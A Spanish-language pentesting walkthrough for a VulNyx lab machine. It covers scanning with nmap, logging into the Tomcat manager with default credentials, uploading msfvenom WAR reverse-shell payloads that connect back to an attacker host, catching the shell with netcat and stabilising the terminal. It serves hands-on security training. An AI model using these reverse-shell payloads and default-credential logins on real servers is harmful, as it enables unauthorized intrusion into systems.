
----
- TAG: #hacking #Servidor #Tomcat
----
Mis disculpas, aquí está el texto corregido con los títulos y subtítulos añadidos:

---

**Hoy vamos a estar viendo cómo explotar un servidor `Apache Tomcat` vulnerable. Vamos a aprender a generar un **payload msfvenom** que sea compatible con `Tomcat` y obtener intrusión en la máquina víctima.**

Vamos a ver 2 tipos de **payloads** diferentes para probar en un servidor `Tomcat`.

Para este ejemplo, utilizaremos una [Máquina Vulnerable - Deploy](https://vulnyx.com/#deploy).

## Procedimiento

Una vez iniciada, vamos a nuestra máquina **Kali Linux** y realizamos el siguiente procedimiento:

1. **Arp-scan** para localizar la máquina víctima.
2. **Ping** para ver el tipo de TTL y entender a qué nos enfrentamos.
3. **Nmap** para encontrar vulnerabilidades y puertos abiertos:
   ```bash
   nmap -p- -sS -sC -sV --open --min-rate=5000 -n -Pn -vvv 1.2.3.4 -oN escaneo
   ```

Al finalizar el escaneo, veremos que nos muestra 3 puertos: `22`, `80` y el puerto `8080`.

En la información del puerto `8080`, observamos que corre un servicio `Tomcat`. Así que nos dirigimos a la dirección IP con el puerto indicado para ver qué nos muestra.

Al principio, parece el inicio normal cuando recién se instala el servicio, sin configurar.

### Acceso al Panel de Configuración

En caso de encontrar un **Tomcat** en el examen, normalmente vendrá así por defecto. Nos dirigimos al vínculo que dice **manager webapp**, donde nos pedirá unas credenciales. Estas credenciales suelen estar por defecto cuando recién se inicia la instalación de **Tomcat**. Si no tienes ni idea, puedes buscar en Google desde otra máquina, ya que en el examen no hay conexión a internet.

**Búsqueda:** hacktricks apache tomcat default credentials

Si abres algún enlace, por ejemplo, este que encontramos:
- [HackTricks - Apache Tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)

Podríamos probar uno a uno, pero a veces ocurre que al poner "cancelar" automáticamente se muestran el usuario y la contraseña:

![[apachetomcat.png]]

Ahora, si nos logueamos, veremos que entramos al panel principal de configuración de **Tomcat**.

### Carga de Archivos Maliciosos

En una página así, por lo general, se encuentra un panel para la carga de archivos, por ejemplo, el **WAR file to deploy**.

En este apartado, seremos capaces de subir archivos maliciosos para ganar intrusión en la máquina víctima.

Para ello, necesitaremos crear el payload con **msfvenom**:

1. Consultamos nuestra dirección IP privada:
   ```bash
   hostname -I
   ```

2. Utilizamos nuestra dirección para indicarle a msfvenom:
   ```bash
   msfvenom -p java/shell_reverse_tcp LHOST=1.2.3.4 LPORT=443 -f war -o reversel.war
   ```

En Tomcat, la subida de archivos puede funcionar o no, así que aquí se indican dos maneras de crear dos payloads diferentes para probar:

Si el primer payload no funciona, podemos probar con este payload agregando `jsp_`:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=1.2.3.4 LPORT=443 -f war -o reverse2.war
```

### Prueba de Payloads

Ahora, si cargamos los archivos, veremos que aparecen en el tablero de inicio. Así que nos ponemos en escucha e intentamos con cada uno de ellos para ver cuál ha funcionado:

```bash
nc -nlvp 443
```

Al probar el primero, veremos que no nos carga y aparece un error. Pero si probamos el segundo payload, obtenemos acceso a la máquina.

### Saneamiento de la Terminal

Ahora realizamos el correcto saneamiento de la terminal:

1. Obtenemos una bash interactiva:
   ```bash
   script /dev/null -c bash
   ```

2. Salimos a la terminal normal y hacemos lo siguiente:
   ```bash
   stty raw -echo; fg
   ```

Recuerda poner lo siguiente en la salida o respuesta:
   ```bash
   reset xterm
   ```

3. Exportamos variables de entorno con:
   ```bash
   export SHELL=bash
   export TERM=xterm
   ```

Y listo, esto sería básicamente cómo explotar una vulnerabilidad de **Apache Tomcat** paso a paso.

---